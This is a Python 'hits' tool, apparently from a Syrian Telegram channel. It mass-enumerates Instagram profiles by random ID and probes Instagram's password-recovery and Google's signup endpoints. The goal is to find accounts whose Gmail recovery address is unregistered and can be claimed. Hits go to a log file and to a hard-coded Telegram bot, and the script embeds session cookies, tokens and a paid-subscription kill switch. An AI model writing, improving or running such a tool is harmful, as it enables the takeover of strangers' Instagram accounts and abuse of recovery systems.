import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
from datetime import datetime
from threading import Thread
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from cfonts import render, say
from colorama import Fore, Style, init
init(autoreset=True)
CYAN    = '\033[1;36m'
GREEN   = '\033[1;32m'
R = '\033[91m'      # الأحمر
bold = '\033[1m'    # غامق
RESET = '\033[0m'   # إعادة تعيين اللون والتنسيق
from rich.console import Console
from rich.text import Text
from rich.panel import Panel
from rich.align import Align
from concurrent.futures import ThreadPoolExecutor


console = Console()

#=======================================

cookies = {
    'PHPSESSID': '8851bf78831b9b6b17338433dbf506da',
    '__test': 'bc7198112fde4db7d978fb2d1a15439f',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ar-DZ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
}

params = {
    'tool': 'AmeenMta7',
    'key': '21232f297a57a5a743894a0e4a801fc3',
    'i': '1',
}

try:
    response = requests.get('https://leadersyria.alchosting.xyz/api.php', params=params, cookies=cookies, headers=headers)
    text = response.text.strip()

    if text:
        try:
            data = response.json()
            status = data.get("status")

            if status == "ON":
                pass  
            elif status == "OFF":
                print(f"{R}{bold}انتهى اشتراكك يرجى الاشتراك @SYRIA7R")
                exit()
            else:
                print(f"{R}{bold}خطأ: الحالة غير معروفة")
        except ValueError:
            print(f"{R}{bold}خطأ في تحليل JSON")
            exit()
    else:
        print(f"{R}{bold}الرد فارغ")
        exit()
except Exception as e:
    print(f"{R}{bold}خطأ في الاتصال:", str(e))
    exit()
#====================≈==================    
INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
IG_SIG_KEY_VERSION = 'ig_sig_key_version'
SIGNED_BODY = 'signed_body'
COOKIE_VALUE = 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
CONTENT_TYPE_HEADER = 'Content-Type'
COOKIE_HEADER = 'Cookie'
USER_AGENT_HEADER = 'User-Agent'
DEFAULT_USER_AGENT = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                      'AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0')


GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
GOOGLE_ACCOUNTS_DOMAIN = 'accounts.google.com'
REFERRER_HEADER = 'referer'
ORIGIN_HEADER = 'origin'
AUTHORITY_HEADER = 'authority'
CONTENT_TYPE_FORM = 'application/x-www-form-urlencoded; charset=UTF-8'
CONTENT_TYPE_FORM_ALT = 'application/x-www-form-urlencoded;charset=UTF-8'

TOKEN_FILE = 'tokenSyria.txt'
eizon_domain = '@gmail.com' 

IMAGE_URL = 'https://ibb.co/HLBwnCKK'
CHANNEL_USERNAME = "@LEADERSYRIA"

E = '\033[1;31m'
W2 = '\x1b[38;5;120m'
W3 = '\x1b[38;5;204m'
W4 = '\x1b[38;5;150m'
W5 = '\x1b[1;33m'
W6 = '\x1b[1;31m'
W7 = "\033[1;33m"
W8 = '\x1b[2;36m'
W8 = f'\x1b[38;5;117m'
W9 = "\033[1m\033[34m"
P = '\x1b[1;97m'
B = '\x1b[1;94m'
O = '\x1b[1;96m'
Z = '\x1b[1;30m'
X = '\x1b[1;33m'
F = '\x1b[2;32m'
Z = '\x1b[1;31m'
L = '\x1b[1;95m'
C = '\x1b[2;35m'
A = '\x1b[2;39m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m'
J21 = '\x1b[38;5;204m'
J22 = '\x1b[38;5;209m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m' 
X = '\033[1;33m' 
Z1 = '\033[2;31m' 
F = '\033[2;32m' 
A = '\033[2;34m'
C = '\033[2;35m' 
S = '\033[2;36m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m' 
X = '\033[1;33m' 
Z1 = '\033[2;31m' 
purple = "\033[1;35m"
F = '\033[2;32m' 
A = '\033[2;34m'
C = '\033[2;35m' 
S = '\033[2;36m'
G = '\033[1;34m' 
HH='\033[1;34m' 
red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
ge = "\033[1;32m" 
bt = "\033[1;31m"  
be = "\033[1;34m"  
F = "\033[1;36m"   # اللون الفيروزي
HH = "\033[1;33m"  # اللون الأصفر
M = "\033[1;35m"   # اللون البنفسجي
Z = "\033[1;31m"   # اللون الأحمر
X = "\033[1;33m"   # اللون الأصفر
G = "\033[1;32m"   # اللون الأخضر
cyan = "\033[1m\033[36m"
magenta = "\033[1m\033[35m"
M = "\033[1m\033[36m"
white = "\033[1m\033[37m"
orange = "\033[1m\033[38;5;208m"
O = '\x1b[38;5;208m' ; Y = '\033[1;34m' ; C = '\033[2;35m' ; M = '\x1b[1;37m'
RED     = '\033[1;31m'
GREEN   = '\033[1;32m'
YELLOW  = '\033[1;33m'
BLUE    = '\033[1;34m'
MAGENTA = '\033[1;35m'
CYAN    = '\033[1;36m'
WHITE   = '\033[1;37m'
GRAY    = '\033[1;90m'
RESET   = '\033[0m'
ORANGE  = '\033[38;5;208m'
bold = "\033[1m"
reset = "\033[0m"

# معلومات البدء
total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0
infoinsta = {}

info_text = Text()
info_text.append(" Developer: ", style="bold white")
info_text.append("@SYRIA7R", style="bold cyan")
info_text.append("   |   ", style="white")
info_text.append("Channel: ", style="bold white")
info_text.append("@LEADERSYRIAPY", style="bold red")

info_panel = Panel(
    Align.center(info_text),
    border_style="cyan",
    title="[bold red]INFO",
    width=60
)

console.print(info_panel)

# مدخلات المستخدم
ID = '7721705352'
print(BLUE + "━" * 66)
TOKEN = '7058414712:AAGtGYTdZG7KmZ0dym_YXfb724vfVoXCYng'

secim = print(f"""
{green}━━━━━━━━━━━━━━━━━━━━━ {yellow}    ✦ Select a Year ✦ {green}━━━━━━━━━━━━━━━━━━━━━

{orange}   [1] {white}→ {yellow}2011        {orange}[2] {white}→ {yellow}2012        {orange}[3] {white}→ {yellow}2013        {orange}[4] {white}→ {yellow}2014
{orange}   [5] {white}→ {yellow}2015        {orange}[6] {white}→ {yellow}2016        {orange}[7] {white}→ {yellow}2017        {orange}[8] {white}→ {yellow}2018
{orange}   [9] {white}→ {yellow}2019        {orange}[0] {white}→ {yellow}All Years {white}(2011~2019)

{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
""")

eizon = input(f"{green}→ {yellow}𝐘𝐨𝐮𝐫 𝐜𝐡𝐨𝐢𝐜𝐞 : {blue}→ ")

os.system('clear')
if eizon == '1':
    bbk = 10000
    id = 17699999
elif eizon == '2':
    bbk = 17699999
    id = 263014407
elif eizon == '3':
    bbk = 263014407
    id = 361365133
elif eizon == '4':
    bbk = 361365133
    id = 1629010000
elif eizon == '5':
    bbk = 1629010000
    id = 2500000000
elif eizon == '6':
    bbk = 2500000000
    id = 3713668786
elif eizon == '7':
    bbk = 3713668786
    id = 5699785217
elif eizon == '8':
    bbk = 5699785217
    id = 8597939245
elif eizon == '9':
    bbk = 8597939245
    id = 21254029834
elif eizon == '0':
    bbk = 10000
    id = 21254029834
else:
    exit()
    
def pppp():
    os.system('cls' if os.name == "nt" else "clear")
    ge = hits              
    bt = bad_insta + bad_email 
    be = good_ig            
    print(f"\r{F}│ {W2}𝐇𝐢𝐭𝐬{WHITE}:{YELLOW} {ge}{RESET}  {F}│ {W3}𝐁𝐚𝐝 𝐈𝐆{WHITE}:{YELLOW} {bt}{RESET}  {F}│ {W4}𝐆𝐨𝐨𝐝 𝐈𝐆{WHITE}:{YELLOW} {be}{RESET}  {F}│ {W5}𝐋𝐞𝐚𝐝𝐞𝐫{WHITE}:{CYAN} 𝐒𝐘𝐑𝐈𝐀𝟕𝐑 ⚡", end="")

def update_stats():
    pppp()

def Eizon():
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
        n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
        host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            USER_AGENT_HEADER: str(generate_user_agent())
        }
        recovery_url = (f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery"
                        "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB")
        res1 = requests.get(recovery_url, headers=headers)
        tok = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            res1.text
        ).group(2)
        cookies = {'__Host-GAPS': host}
        headers2 = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: ('https://accounts.google.com/signup/v2/createaccount'
                              '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
            USER_AGENT_HEADER: generate_user_agent()
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                           'null,0,1,"",null,null,2,2]')
        }
        response = requests.post(f"{GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails",
                                 cookies=cookies, headers=headers2, data=data)
        token_line = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        with open(TOKEN_FILE, 'w') as f:
            f.write(f"{token_line}//{host}\n")
    except Exception as e:
        print(e)
        Eizon()

Eizon()

def check_gmail(email):
    global bad_email, hits
    try:
        if '@' in email:
            email = email.split('@')[0]
        with open(TOKEN_FILE, 'r') as f:
            token_data = f.read().splitlines()[0]
        tl, host = token_data.split('//')
        cookies = {'__Host-GAPS': host}
        headers = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            USER_AGENT_HEADER: generate_user_agent()
        }
        params = {'TL': tl}
        data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
        response = pp(f"{GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability",
                      params=params, cookies=cookies, headers=headers, data=data)
        if '"gf.uar",1' in response.text:
            hits += 1
            update_stats()
            full_email = email + eizon_domain
            username, domain = full_email.split('@')
            InfoAcc(username, domain)
        else:
            bad_email += 1
            update_stats()
    except Exception:
        pass

def check(email):
    global good_ig, bad_insta
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    headers = {
        USER_AGENT_HEADER: ua,
        COOKIE_HEADER: COOKIE_VALUE,
        CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM
    }
    data = {
        SIGNED_BODY: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                      json.dumps({
                          '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                          'adid': uui,
                          'guid': uui,
                          'device_id': device_id,
                          'query': email
                      })),
        IG_SIG_KEY_VERSION: '4'
    }
    response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).text
    if email in response:
        if eizon_domain in email:
            check_gmail(email)
        good_ig += 1
        update_stats()
    else:
        bad_insta += 1
        update_stats()

def rest(user):
    try:
        headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': ('c80c5fb30dfae9e273e4009f03b18280'
                                   'bb343b0862d663f31a3c63f13a9f31c0'),
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            USER_AGENT_HEADER: ('Instagram 100.0.0.17.129 Android (29/10; 420dpi; '
                                '1080x2129; samsung; SM-M205F; m20lte; exynos7904; '
                                'en_GB; 161478664)'),
            'Accept-Language': 'en-GB, en-US',
            COOKIE_HEADER: COOKIE_VALUE,
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM,
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356'
        }
        data = {
            SIGNED_BODY: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'
                          '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                          '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
                          '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
                          '"device_id":"android-b93ddb37e983481c",'
                          '"query":"' + user + '"}'),
            IG_SIG_KEY_VERSION: '4'
        }
        response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).json()
        eizonporno = response.get('email', 'Reset None')
    except:
        eizonporno = 'Reset None'
    return eizonporno

def date(hy):
    try:
        ranges = [
            (1279000, 2010),
            (17750000, 2011),
            (279760000, 2012),
            (900990000, 2013),
            (1629010000, 2014),
            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019),
        ]
        for upper, year in ranges:
            if hy <= upper:
                return year
        return 2023
    except Exception:
        pass

def InfoAcc(username, domain):
    global total_hits
    account_info = infoinsta.get(username, {})
    user_id = account_info.get('pk')
    full_name = account_info.get('full_name')
    followers = account_info.get('follower_count')
    following = account_info.get('following_count')
    posts = account_info.get('media_count')
    bio = account_info.get('biography')
    account_creation_date = account_info.get('account_creation_date', 'غير محدد')
    total_hits += 1
    info_text = f"""
 𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 
═══════════════════
 𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : 𝐋𝐞𝐚𝐝𝐞𝐫
═══════════════════
🇸🇾 عدد الحسابات : {total_hits}
🇸🇾 اسم المستخدم : {username}
🇸🇾 البريد الإلكتروني : {username}@{domain}
🇸🇾 عدد المتابعين : {followers}
🇸🇾 عدد المتابعات : {following}
🇸🇾 عدد المنشورات : {posts}
🇸🇾 التاريخ :{account_creation_date}
═══════════════════ ╔════════════════════════════════════════╗
 @SYRIA7R | 𝐋𝐞𝐚𝐝𝐞𝐫
 ║ @Leadersyriapy | 𝐋𝐞𝐚𝐝𝐞𝐫 ║
 ╚════════════════════════════════════════╝
"""
    with open('leadersytia.txt', 'a') as f:
        f.write(info_text + "\n")
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}")
    except Exception:
        pass

def eizon_python():
    while True:
        data = {
            'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            'variables': json.dumps({
                'id': int(random.randrange(bbk, id)),
                'render_surface': 'PROFILE'
            }),
            'doc_id': '25618261841150840'
        }
        headers = {'X-FB-LSD': data['lsd']}
        try:
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            account = response.json().get('data', {}).get('user', {})
            username = account.get('username')
            if username:
                infoinsta[username] = account
                emails = [username + eizon_domain]
                for email in emails:
                    check(email)
        except Exception:
            pass


with ThreadPoolExecutor(max_workers=100) as executor:
    for _ in range(100):
        executor.submit(eizon_python)